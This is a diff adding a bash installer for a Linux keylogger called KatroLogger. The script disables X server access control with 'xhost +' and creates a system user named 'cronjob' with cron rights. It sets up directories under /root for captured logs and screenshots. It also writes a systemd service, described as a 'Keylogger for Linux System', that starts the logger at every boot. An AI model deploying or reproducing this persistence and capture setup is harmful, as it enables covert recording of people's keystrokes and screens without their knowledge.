@@ -1,0 +1,89 @@
+#!/bin/bash
+CONFIG="/root/.katrologger/config"
+LOGS="/root/.katrologger/logs"
+RUN="/root/.katrologger/run"
+ARG="/root/.katrologger/run/arg"
+SERVICE="/etc/systemd/system/katrologger.service"
+CRON="/etc/cron.allow"
+SCREENSHOTS="/root/.katrologger/screenshots"
+
+###### CHECKING PACKAGES ######
+if which apt &> /dev/null
+then
+   if ! dpkg -s x11-xserver-utils &> /dev/null
+   then
+     echo "[ - ] checking package x11-xserver-utils.. not found"
+   else
+     XSERVER_UTILS_VERSION=$(dpkg-query -W -f='${Version}' x11-xserver-utils)
+     echo "[ + ] x11-xserver-utils $XSERVER_UTILS_VERSION.. yes"
+     xhost + &> /dev/null
+     echo "[ + ] adding connection permission to the X server.. yes"
+   fi
+fi
+
+###### CRON ######
+if [ $(grep cronjob /etc/passwd | grep -c cronjob) -eq 1 ]
+then
+  echo "[ + ] cronjob user already exists"
+else
+  useradd --system --no-create-home --no-user-group --shell /usr/sbin/nologin cronjob &> /dev/null
+  echo "[ + ] create user cronjob"
+fi
+
+if [ ! -f $CRON ]; then > $CRON; fi
+
+if [ $(grep cronjob /etc/cron.allow | grep -c cronjob) -eq 0 ]
+then
+    echo "[ + ] add user 'cronjob' in $CRON"
+    echo "cronjob" >> /etc/cron.allow
+fi
+
+###### CONFIG ######
+echo "[+] creating settings for the katrologer in /root/.katrologer/..."
+if [ ! -d $CONFIG ]; then
+  mkdir -p $CONFIG
+  echo "[ok] create directory: $CONFIG"
+fi
+
+if [ ! -d $LOGS ]; then
+  mkdir -p $LOGS
+  echo "[ok] create directory: $LOGS"
+fi
+
+if [ ! -d $RUN ]; then
+  mkdir -p $RUN
+  echo "[ok] create directory: $RUN"
+fi
+
+if [ ! -d $SCREENSHOTS ]; then
+  mkdir -p $SCREENSHOTS
+  chown cronjob $SCREENSHOTS
+  echo "[ok] create directory: $SCREENSHOTS"
+fi
+
+###### SYSTEMD UNIT FILES ######
+echo "[+] systemd: create unit-file in --> $SERVICE"
+cat << 'EOF' > $SERVICE
+[Unit]
+Description=Keylogger for Linux System
+Documentation=https://github.com/Katrovisch/KatroLogger
+After=multi-user.target
+
+[Service]
+ExecStartPre=/root/.katrologger/run/arg
+EnvironmentFile=-/root/.katrologger/environment
+ExecStart=/usr/bin/katrologger --output $LOGGER_FILE --no-daemon
+ExecStop=/usr/bin/katrologger --kill
+
+[Install]
+WantedBy=multi-user.target
+EOF
+
+###### AUTO-START SCRIPT ######
+echo "[+] create script --> $ARG for auto-start"
+cat << 'EOF' > $ARG
+#!/bin/bash
+FILE=$(cat /root/.katrologger/config/path.conf)
+echo "LOGGER_FILE=\"$FILE\"" > /root/.katrologger/environment
+EOF
+chmod +x $ARG
